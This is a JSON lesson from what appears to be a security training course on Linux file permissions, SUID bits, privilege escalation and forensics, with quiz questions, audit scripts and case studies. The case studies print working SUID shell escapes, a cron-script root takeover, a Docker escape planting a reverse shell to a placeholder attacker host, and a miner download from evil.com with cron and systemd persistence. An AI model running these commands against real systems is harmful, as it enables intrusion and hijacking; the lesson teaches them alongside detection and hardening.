{
  "lesson_id": "2049e227-a7cf-4034-afdb-e2474742d6fb",
  "domain": "system",
  "title": "Linux File Systems & Security Models",
  "difficulty": 2,
  "order_index": 8,
  "prerequisites": [
    "sys4-linux-internals-001",
    "sys6-linux-proc-mgmt-001"
  ],
  "concepts": [
    "Linux File System Hierarchy",
    "File Permissions and Ownership",
    "SUID, SGID, and Sticky Bit",
    "Access Control Lists (ACLs)",
    "File System Types (ext4, XFS, Btrfs)",
    "Mount Points and /etc/fstab",
    "Symbolic and Hard Links",
    "File System Security Attributes",
    "Privilege Escalation via File Permissions",
    "File System Forensics"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Master Linux file system hierarchy and its security implications",
    "Understand file permissions, ownership, and special bits (SUID/SGID/Sticky)",
    "Learn to identify and exploit weak file permissions for privilege escalation",
    "Understand Access Control Lists (ACLs) for granular permissions",
    "Analyze file system configurations for security misconfigurations",
    "Perform file system forensics for incident response"
  ],
  "post_assessment": [
    {
      "question": "What does the SUID bit do when set on an executable?",
      "options": [
        "Makes file immutable",
        "Runs file as file owner",
        "Prevents file deletion",
        "Encrypts the file"
      ],
      "correct_answer": 1,
      "explanation": "SUID (Set User ID) causes the executable to run with the permissions of the file owner, not the user executing it. If owner is root, this can lead to privilege escalation.",
      "question_id": "3f42cca2-a1da-4d61-a31a-61fbbed42e54",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which permission octal represents rwsr-xr-x (SUID set)?",
      "options": [
        "0755",
        "4755",
        "2755",
        "1755"
      ],
      "correct_answer": 1,
      "explanation": "4755 sets SUID (4000) + rwx for owner (700) + r-x for group (50) + r-x for others (5) = 4755",
      "question_id": "f54cdb22-827a-4c41-aa0d-80044141d2af",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What directory typically contains configuration files?",
      "options": [
        "/bin",
        "/etc",
        "/var",
        "/tmp"
      ],
      "correct_answer": 1,
      "explanation": "/etc contains system-wide configuration files. Misconfigurations here can lead to security vulnerabilities.",
      "question_id": "d2731236-ff3b-4d30-964e-ce0a0ebe399c",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Linux File Systems & Security!\n\nThe file system is where EVERYTHING lives in Linux - and understanding it is absolutely critical for both attack and defense.\n\n**Why This Matters:**\n\n**For Attackers (Red Team/Pentest):**\n- 60%+ of Linux privilege escalation exploits involve file permissions\n- SUID binaries are the #1 priv esc vector\n- Writable config files = path to root\n- World-writable directories = persistence opportunities\n\n**For Defenders (Blue Team/IR):**\n- File integrity monitoring (FIM) relies on file system knowledge\n- Malware persistence uses file system locations\n- Log analysis requires understanding /var/log structure\n- Incident response depends on file system forensics\n\n**Real-World Impact:**\n- **DirtyCOW** exploit → file system race condition\n- **Docker escapes** → mount misconfiguration\n- **Cryptocurrency miners** → hide in /tmp with noexec bypasses\n- **Rootkits** → manipulate file system to hide\n\n**What You'll Master:**\n✓ Linux file system hierarchy (FHS)\n✓ Permission model (rwx, SUID, SGID, sticky bit)\n✓ Privilege escalation via file permissions\n✓ ACLs for advanced access control\n✓ File system forensics techniques\n✓ Security hardening strategies\n\nLet's explore the file system - where every attack leaves traces and every misconfiguration creates opportunities!"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Linux File Systems & Security Models Overview",
        "url": "https://www.youtube.com/embed/Vh_h6NfLkAg",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Linux File System Hierarchy (FHS)\n\n## The Standard Directory Structure\n\n```\nLinux File System Tree:\n\n/\n├── bin/          → Essential user binaries (ls, cp, cat)\n├── sbin/         → System binaries (init, mount, ifconfig)\n├── boot/         → Boot loader files (kernel, initrd)\n├── dev/          → Device files (sda, null, random)\n├── etc/          → Configuration files (passwd, shadow, ssh)\n│   ├── passwd    → User account database\n│   ├── shadow    → Password hashes (requires root)\n│   └── sudoers   → Sudo configuration\n├── home/         → User home directories\n│   ├── user1/\n│   └── user2/\n├── root/         → Root user's home\n├── lib/          → Shared libraries\n├── lib64/        → 64-bit libraries\n├── opt/          → Optional software\n├── proc/         → Virtual FS (process info)\n│   ├── [PID]/    → Process directories\n│   └── cpuinfo   → CPU information\n├── sys/          → Virtual FS (device/kernel info)\n├── tmp/          → Temporary files (DANGEROUS: world-writable)\n├── usr/          → User programs and data\n│   ├── bin/      → User commands\n│   ├── lib/      → Libraries\n│   └── local/    → Locally installed software\n└── var/          → Variable data\n├── log/      → Log files (CRITICAL for IR)\n├── www/      → Web server content\n└── tmp/      → Temporary files\n```bash\n\n## Security-Critical Directories\n\n### 1. /etc - Configuration Goldmine\n```bash\n/etc/passwd     → User accounts (world-readable)\n/etc/shadow     → Password hashes (root only)\n/etc/sudoers    → Sudo permissions (ALWAYS check this!)\n/etc/crontab    → Scheduled tasks (persistence)\n/etc/ssh/       → SSH configuration\n/etc/systemd/   → Systemd service configs\n\nAttacker Interest: HIGH\n- Modify sudoers → instant root\n- Add cron job → persistence\n- Read shadow → password cracking\n```bash\n\n### 2. /tmp and /var/tmp - The Wild West\n```bash\nPermissions: drwxrwxrwt (1777)\n↑\nSticky bit (only owner can delete)\n\nSecurity Issues:\n- World-writable (anyone can write)\n- Often used for malware staging\n- Sometimes mounted noexec (can be bypassed)\n- Cleaned on reboot (or not, depends on /var/tmp)\n\nCommon Attacks:\n- Upload malware to /tmp\n- Privilege escalation scripts\n- Symlink attacks\n```bash\n\n### 3. /var/log - Forensic Evidence\n```bash\n/var/log/auth.log    → Authentication attempts\n/var/log/syslog      → System messages\n/var/log/kern.log    → Kernel messages\n/var/log/apache2/    → Web server logs\n/var/log/mysql/      → Database logs\n\nAttacker Actions:\n- Delete logs (cover tracks)\n- Modify timestamps (anti-forensics)\n- Inject fake entries (misdirection)\n\nDefender Actions:\n- Monitor for suspicious activity\n- Centralize logs (prevents deletion)\n- Enable write-once logging\n```bash\n\n### 4. /proc - Process & Kernel Info\n```bash\n/proc/[PID]/cmdline  → Command line of process\n/proc/[PID]/environ  → Environment variables\n/proc/[PID]/fd/      → Open file descriptors\n/proc/sys/           → Kernel parameters\n\nSecurity Uses:\n- Process enumeration\n- Kernel version detection\n- Finding hidden processes (compare /proc vs ps)\n```bash\n\n### 5. /dev - Device Files\n```bash\n/dev/null      → Discard output\n/dev/random    → True random (blocks if entropy low)\n/dev/urandom   → Pseudo-random (doesn't block)\n/dev/zero      → Infinite zeros\n/dev/sda       → First hard drive\n\nSecurity Implications:\n- /dev/mem (raw memory access) - extremely dangerous\n- /dev/kmem (kernel memory) - can read/modify kernel\n- Direct disk access via /dev/sda (forensics)\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Linux File Permissions Deep Dive\n\n## Understanding Permission Notation\n\n```bash\n# Example: -rwsr-xr-x\n#          ↑↑↑↑↑↑↑↑↑↑\n#          │││││││││└─ Others: execute\n#          ││││││││└── Others: read\n#          │││││││└─── Others: write (not set)\n#          ││││││└──── Group: execute\n#          │││││└───── Group: read\n#          ││││└────── Group: write (not set)\n#          │││└─────── Owner: execute\n#          ││└──────── Owner: read\n#          │└───────── Owner: write\n#          └────────── Special: SUID bit (s instead of x)\n\n# File type indicators:\n- = regular file\nd = directory\nl = symbolic link\nc = character device\nb = block device\np = named pipe (FIFO)\ns = socket\n```bash\n\n## Octal Permission Notation\n\n```bash\n# Permissions are represented by 4 digits: SUGO\n# S = Special bits (SUID, SGID, Sticky)\n# U = User/Owner permissions\n# G = Group permissions\n# O = Other permissions\n\n# Permission values:\nr (read)    = 4\nw (write)   = 2\nx (execute) = 1\n\n# Examples:\nrwx = 4+2+1 = 7\nrw- = 4+2+0 = 6\nr-x = 4+0+1 = 5\nr-- = 4+0+0 = 4\n\n# Special bits:\nSUID = 4000\nSGID = 2000\nSticky = 1000\n\n# Full examples:\n0644 = rw-r--r--  (common for files)\n0755 = rwxr-xr-x  (common for executables)\n4755 = rwsr-xr-x  (SUID executable)\n2755 = rwxr-sr-x  (SGID executable)\n1777 = rwxrwxrwt  (/tmp directory)\n```bash\n\n## Viewing and Modifying Permissions\n\n```bash\n# View permissions\nls -l filename\nls -la          # Include hidden files\nls -ld /tmp     # Directory itself, not contents\n\n# Symbolic notation\nchmod u+x file      # Add execute for user\nchmod g-w file      # Remove write for group\nchmod o=r file      # Set other to read-only\nchmod a+r file      # Add read for all (user, group, other)\nchmod u+s file      # Set SUID\n\n# Octal notation\nchmod 644 file      # rw-r--r--\nchmod 755 file      # rwxr-xr-x\nchmod 4755 file     # rwsr-xr-x (SUID)\nchmod 2755 file     # rwxr-sr-x (SGID)\nchmod 1777 dir      # rwxrwxrwt (sticky)\n\n# Ownership\nchown user file           # Change owner\nchown user:group file     # Change owner and group\nchgrp group file          # Change group only\n\n# Recursive\nchmod -R 755 directory/\nchown -R user:group directory/\n```bash\n\n## Finding Files by Permissions (Security Auditing)\n\n```bash\n# Find SUID files (HIGH PRIORITY for privilege escalation)\nfind / -perm -4000 -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null\n\n# Find SGID files\nfind / -perm -2000 -type f 2>/dev/null\n\n# Find world-writable files (DANGEROUS)\nfind / -perm -002 -type f 2>/dev/null\nfind / -perm -o+w -type f 2>/dev/null\n\n# Find world-writable directories\nfind / -perm -002 -type d 2>/dev/null\n\n# Find files with no owner (orphaned)\nfind / -nouser -o -nogroup 2>/dev/null\n\n# Find files modified in last 24 hours (incident response)\nfind / -mtime -1 -type f 2>/dev/null\n\n# Find files with specific permissions\nfind / -perm 777 2>/dev/null  # Exact match\nfind / -perm -777 2>/dev/null # At least these permissions\n\n# Combine criteria\nfind /home -type f -perm -o+w ! -name '*.log' 2>/dev/null\n```bash\n\n## Special Permission Bits in Action\n\n```bash\n# SUID Example: /bin/passwd\nls -l /bin/passwd\n# Output: -rwsr-xr-x 1 root root ... /bin/passwd\n#              ↑\n#         SUID bit allows users to change their password\n#         (requires writing to /etc/shadow, which is root-only)\n\n# SGID Example: /var/mail directory\nls -ld /var/mail\n# Output: drwxrwsr-x 2 root mail ... /var/mail\n#                 ↑\n#         Files created inherit 'mail' group\n\n# Sticky Bit Example: /tmp\nls -ld /tmp\n# Output: drwxrwxrwt 20 root root ... /tmp\n#                   ↑\n#         Users can only delete their own files\n```"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for File System Security\n\n## Permission Octals: \"**7** is **A**ll, **5** is **R**un/**R**ead\"\n\n```\n7 = rwx = \"All permissions\" (4+2+1)\n6 = rw- = \"Write and read\" (4+2)\n5 = r-x = \"Read and execute\" (4+1)\n4 = r-- = \"Read only\" (4)\n0 = --- = \"No access\"\n\nCommon combos:\n755 = \"Owner can do All(7), others can Run(5)\"\n644 = \"Owner can read/Write(6), others Read only(4)\"\n```bash\n\n## Special Bits: \"**S**uper **G**roup **T**ogether\"\n\n```\n4000 = SUID = \"Super user\" (runs as owner)\n2000 = SGID = \"Group inheritance\"\n1000 = Sticky = \"Together we share, but can't delete each other's files\"\n\nVisual:\nSUID: s in owner execute    (rwSr-xr-x)\nSGID: s in group execute    (rwxr-Sr-x)\nSticky: t in other execute  (rwxrwxrwT)\n\nCapital S/T = bit set but NO execute permission (rare, usually wrong)\n```bash\n\n## Critical Directories: \"**E**TC **T**MP **V**AR\"\n\n```\n/etc  = \"Everything To Configure\"\n- passwd, shadow, sudoers\n- Configuration files\n\n/tmp  = \"Temporary Malware Playground\"\n- World-writable\n- Attacker staging area\n\n/var  = \"Various logs and data\"\n- /var/log (evidence)\n- /var/www (web content)\n```bash\n\n## Find Command Mnemonic: \"**P**ermissions **U**ser **M**odified **T**ype\"\n\n```\nfind / -perm -4000   → \"P\"ermissions (SUID hunting)\nfind / -user root    → \"U\"ser (find root-owned files)\nfind / -mtime -1     → \"M\"odified (last 24 hours)\nfind / -type f       → \"T\"ype (files only)\n```bash\n\n## Permission Check Flow: \"**O**wner → **G**roup → **O**ther\"\n\n```\nWhen you access a file:\n1. Are you the Owner? → Use owner permissions\n2. Are you in Group?  → Use group permissions\n3. Everyone else      → Use other permissions\n\nExample: -rwxr-x---\nOwner: rwx (can do anything)\nGroup: r-x (can read/execute)\nOther: --- (no access)\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World File System Attacks\n\n## Case Study 1: SUID Binary Privilege Escalation\n\n**Scenario:** Linux web server compromise (2020)\n\n**Initial Access:** Web application vulnerability (low-privileged www-data user)\n\n**Privilege Escalation:**\n```bash\n# Attacker enumerates SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Finds:\n-rwsr-xr-x 1 root root ... /usr/bin/find\n\n# Exploit: SUID find allows arbitrary command execution\nfind /home -exec whoami \\;\n# Output: root  ← Running as root!\n\n# Get root shell\nfind /home -exec /bin/bash -p \\;\n# Now: root@server#\n```\n\n**Why It Worked:**\n- Custom find binary had SUID bit set (misconfiguration)\n- `-exec` flag allows running arbitrary commands\n- Commands run with file owner privileges (root)\n\n**Other SUID Exploits:**\n```bash\n# vim with SUID\nvim -c ':!bash'\n\n# nmap with SUID (old versions)\nnmap --interactive\nnmap> !sh\n\n# awk with SUID\nawk 'BEGIN {system(\"/bin/bash\")}'\n\n# python with SUID\npython -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n\n---\n\n## Case Study 2: World-Writable File Exploit\n\n**Vulnerability:** Misconfigured backup script\n\n```bash\n# /usr/local/bin/backup.sh (owned by root, scheduled via cron)\n# !/bin/bash\ntar -czf /backups/backup.tar.gz /var/www\n\n# Permission check:\nls -l /usr/local/bin/backup.sh\n-rwxrwxrwx 1 root root ... backup.sh  ← WORLD WRITABLE!\n```\n\n**Attack:**\n```bash\n# Attacker modifies script\necho 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh\n\n# Wait for cron to execute (as root)\n# Check if exploit worked:\nls -l /bin/bash\n-rwsr-xr-x 1 root root ... /bin/bash  ← SUID now set!\n\n# Get root shell\n/bin/bash -p\n# Now: root@server#\n```\n\n**Lesson:** World-writable scripts executed by root = instant privilege escalation\n\n---\n\n## Case Study 3: /tmp Race Condition (TOCTOU)\n\n**Vulnerability:** Time-Of-Check-Time-Of-Use in temp file handling\n\n```bash\n# Vulnerable script running as root:\n# !/bin/bash\nTEMPFILE=\"/tmp/process_$$\"  # $$ = PID\nif [ ! -e \"$TEMPFILE\" ]; then  # Check\n# ... some processing ...\necho \"data\" > \"$TEMPFILE\"  # Use (later)\nfi\n```\n\n**Attack (Race Condition):**\n```bash\n# Attacker creates symlink before script's \"Use\" phase:\nwhile true; do\nln -sf /etc/shadow /tmp/process_[PID] 2>/dev/null\ndone\n\n# If timing is right:\n# Script checks: /tmp/process_[PID] doesn't exist ✓\n# Attacker creates symlink: /tmp/process_[PID] -> /etc/shadow\n# Script writes: echo \"data\" > /tmp/process_[PID]\n# Result: Overwrites /etc/shadow with \"data\"!\n```\n\n**Fix:** Use `mktemp` for secure temp files\n```bash\nTEMPFILE=$(mktemp)  # Creates unique, secure file\n```\n\n---\n\n## Case Study 4: Docker Container Escape via Mount\n\n**Scenario:** Misconfigured Docker container\n\n```bash\n# Container started with:\ndocker run -v /:/host ubuntu\n\n# From inside container:\nls /host\n# Output: Full host file system mounted!\n\n# Escape to host:\nchroot /host /bin/bash\n# Now on host system with host's file system\n\n# Or modify host's cron:\necho '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> /host/etc/crontab\n```\n\n**Impact:** Full host compromise from container\n\n---\n\n## Case Study 5: Cryptocurrency Miner Persistence\n\n**Attack Chain:**\n```bash\n# 1. Initial compromise (SSH brute force)\n\n# 2. Download miner to /tmp\ncd /tmp\nwget http://evil.com/xmrig\nchmod +x xmrig\n\n# 3. Run miner\n./xmrig -o pool.hashvault.pro:80 &\n\n# 4. Persistence via cron (if writable)\nif [ -w /etc/crontab ]; then\necho \"@reboot root /tmp/xmrig &\" >> /etc/crontab\nfi\n\n# 5. Hide process (rename to look legitimate)\nmv xmrig kworker\n./kworker &  # Looks like kernel worker thread\n\n# 6. Alternative persistence: systemd service\nif [ -w /etc/systemd/system ]; then\ncat > /etc/systemd/system/kworker.service <<EOF\n[Unit]\nDescription=Kernel Worker Thread\n\n[Service]\nExecStart=/tmp/kworker\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable kworker.service\nsystemctl start kworker.service\nfi\n```\n\n**Detection:**\n```bash\n# Find suspicious files in /tmp\nfind /tmp -type f -executable\n\n# Check for outbound crypto mining connections\nlsof -i | grep -E ':[0-9]{4}.*ESTABLISHED'\nnetstat -anp | grep ESTABLISHED | grep -v ':22\\|:80\\|:443'\n\n# Check crontab for unusual entries\ncrontab -l\ncat /etc/crontab\nls -la /etc/cron.d/\n\n# Check systemd services\nsystemctl list-unit-files | grep enabled | grep -v '@'\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Comprehensive File System Security Audit Script\n\n```bash\n# !/bin/bash\n# linux_fs_audit.sh - Find security misconfigurations\n\necho \"======================================\"\necho \"Linux File System Security Audit\"\necho \"======================================\"\necho \"\"\n\n# 1. SUID/SGID Files\necho \"[1] SUID Binaries (Privilege Escalation Vectors):\"\nfind / -perm -4000 -type f -exec ls -lh {} \\; 2>/dev/null | \\\ngrep -v '/usr/bin/\\|/usr/lib/\\|/bin/\\|/sbin/' | head -20\necho \"\"\n\necho \"[2] SGID Binaries:\"\nfind / -perm -2000 -type f -exec ls -lh {} \\; 2>/dev/null | head -10\necho \"\"\n\n# 2. World-Writable Files\necho \"[3] World-Writable Files (DANGER!):\"\nfind / -path /proc -prune -o -perm -002 -type f -exec ls -lh {} \\; 2>/dev/null | \\\ngrep -v '/tmp/\\|/var/tmp/' | head -10\necho \"\"\n\necho \"[4] World-Writable Directories:\"\nfind / -path /proc -prune -o -perm -002 -type d -exec ls -ldh {} \\; 2>/dev/null | \\\ngrep -v '/tmp$\\|/var/tmp' | head -10\necho \"\"\n\n# 3. Files with no owner\necho \"[5] Files with No Owner (Orphaned):\"\nfind / -nouser -o -nogroup 2>/dev/null | head -10\necho \"\"\n\n# 4. Check /etc permissions\necho \"[6] Critical /etc File Permissions:\"\nls -lh /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null\necho \"\"\n\n# 5. Check for suspicious cron jobs\necho \"[7] Cron Jobs (check for persistence):\"\necho \"--- /etc/crontab ---\"\ncat /etc/crontab 2>/dev/null\necho \"--- /etc/cron.d/ ---\"\nls -la /etc/cron.d/ 2>/dev/null\necho \"\"\n\n# 6. Check /tmp and /var/tmp\necho \"[8] Files in /tmp and /var/tmp:\"\nfind /tmp /var/tmp -type f -exec ls -lh {} \\; 2>/dev/null | head -20\necho \"\"\n\n# 7. Recently modified files (potential backdoors)\necho \"[9] Files Modified in Last 24 Hours:\"\nfind /etc /usr/local/bin /usr/local/sbin -mtime -1 -type f 2>/dev/null | head -20\necho \"\"\n\n# 8. Check for SSH keys\necho \"[10] SSH Authorized Keys:\"\nfind /home -name authorized_keys -exec ls -lh {} \\; 2>/dev/null\nfind /root -name authorized_keys -exec ls -lh {} \\; 2>/dev/null\necho \"\"\n\n# 9. Check mount points\necho \"[11] Mount Points (check for nosuid, noexec):\"\nmount | grep -E '^/dev'\necho \"\"\n\n# 10. Find hidden files in unusual locations\necho \"[12] Hidden Files in /tmp and Home Directories:\"\nfind /tmp /home -name \".*\" -type f 2>/dev/null | head -20\necho \"\"\n\necho \"======================================\"\necho \"Audit Complete\"\necho \"======================================\"\n```bash\n\n## Privilege Escalation Enumeration\n\n```bash\n# !/bin/bash\n# privesc_check.sh - Quick privilege escalation check\n\n# Check current privileges\necho \"[+] Current User:\"\nid\nwhoami\necho \"\"\n\n# Check sudo permissions\necho \"[+] Sudo Permissions:\"\nsudo -l 2>/dev/null\necho \"\"\n\n# SUID binaries\necho \"[+] Interesting SUID Binaries:\"\nfind / -perm -4000 2>/dev/null | grep -E 'nmap|vim|find|bash|more|less|nano|cp|python|perl|ruby|awk|man|taskset'\necho \"\"\n\n# Writable /etc/passwd\necho \"[+] Can we write to /etc/passwd?\"\nls -l /etc/passwd\necho \"\"\n\n# Scheduled tasks\necho \"[+] Writable Cron Jobs:\"\nfind /etc/cron* -writable 2>/dev/null\necho \"\"\n\n# Writable systemd services\necho \"[+] Writable Systemd Services:\"\nfind /etc/systemd/system -writable 2>/dev/null\necho \"\"\n\n# Check kernel version (for kernel exploits)\necho \"[+] Kernel Version:\"\nuname -a\necho \"\"\n\n# Mounted file systems\necho \"[+] Interesting Mounts:\"\nmount | grep -v \"^/dev\" | grep -v \"proc\\|sys\\|cgroup\"\necho \"\"\n```"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You've Mastered Linux File System Security!\n\n**Outstanding work!** File system security is one of the MOST practical skills you can have.\n\n## What You've Achieved:\n\n✅ **FHS Mastery**: Understand the standard Linux directory structure\n✅ **Permission System**: Master rwx, SUID, SGID, sticky bit\n✅ **Security Auditing**: Can find misconfigurations and vulnerabilities\n✅ **Privilege Escalation**: Understand file-based priv esc vectors\n✅ **Forensics**: Know where to look for evidence\n✅ **Hardening**: Can secure file system configurations\n\n## Real-World Relevance:\n\n**Penetration Testing:**\n- File permission enumeration is STEP 1 of every Linux priv esc\n- SUID binary hunting is in EVERY pentest methodology\n- Writable files are your path to persistence\n\n**Incident Response:**\n- File system analysis is crucial for understanding breach scope\n- Timeline analysis uses file modification times\n- Malware often hides in /tmp, /var/tmp, or hidden files\n\n**System Hardening:**\n- Regular SUID audits prevent privilege escalation\n- Proper mount options (nosuid, noexec) limit attack surface\n- File integrity monitoring catches unauthorized changes\n\n## Connect Your Knowledge:\n\n**Previous Lessons:**\n- Linux Processes → Now you know where their binaries live\n- Windows Services → Similar concepts, different implementation\n\n**Next Lessons:**\n- Linux Security Mechanisms → SELinux, AppArmor build on file permissions\n- Container Security → Uses file system namespaces and mount isolation\n\n## You're Building Expertise:\n\nEvery skill you've learned connects:\n1. **Understanding processes** + **file permissions** = Complete privilege escalation knowledge\n2. **File system** + **logs** = Incident response capability\n3. **Mount points** + **containers** = Container escape understanding\n\n## Practice Challenges:\n\n1. **Audit your own system**: Run the audit script on a Linux VM\n2. **Hunt SUID binaries**: Find all SUID files and research which are exploitable\n3. **Set up monitoring**: Configure file integrity monitoring (AIDE/Tripwire)\n4. **Practice hardening**: Secure /tmp with proper mount options\n5. **Simulate attack**: Create a vulnerable file and exploit it\n\n**Remember:** 60%+ of Linux privilege escalations involve file permissions. You now have the skills to find AND fix these vulnerabilities!\n\nKeep building on this foundation - you're becoming a true Linux security expert!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Knowledge Integration & Application\n\n## 1. Permission Analysis\n\n**You find a file with these permissions: `-rwsr-sr-x 1 root staff`**\n\n**Questions:**\n- What are the octal permissions?\n- What special bits are set?\n- What security implications does this have?\n- If you execute this as a regular user, what privileges will you have?\n\n**Your Analysis:**\n___________________________________________\n___________________________________________\n\n---\n\n## 2. Privilege Escalation Scenario\n\n**During a pentest, you run:**\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n**And find:**\n```\n/usr/bin/vim\n-rwsr-xr-x 1 root root\n```\n\n**Questions:**\n- Is this exploitable?\n- How would you exploit it?\n- What would you get?\n\n**Your Exploitation Steps:**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n\n---\n\n## 3. Incident Response\n\n**You're investigating a compromised server. Where would you look for:**\n\n**a) Malware staging area:**\n___________________________________________\n\n**b) Persistence mechanisms:**\n___________________________________________\n\n**c) Authentication logs:**\n___________________________________________\n\n**d) Recently modified system files:**\n___________________________________________\n\n---\n\n## 4. Forensic Analysis\n\n**You find this file:**\n```bash\n-rwxrwxrwx 1 nobody nogroup 15234 Nov 23 03:47 /tmp/.hidden\n```\n\n**Red flags:**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n\n**What would you check next?**\n___________________________________________\n\n---\n\n## 5. Hardening Strategy\n\n**You need to harden a production Linux server. List 5 file system security measures:**\n\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n4. ___________________________________\n5. ___________________________________\n\n---\n\n## 6. Real-World Connection\n\n**How do file system permissions relate to:**\n\n**a) Container security:**\n___________________________________________\n\n**b) Web application security:**\n___________________________________________\n\n**c) Ransomware attacks:**\n___________________________________________"
      }
    }
  ]
}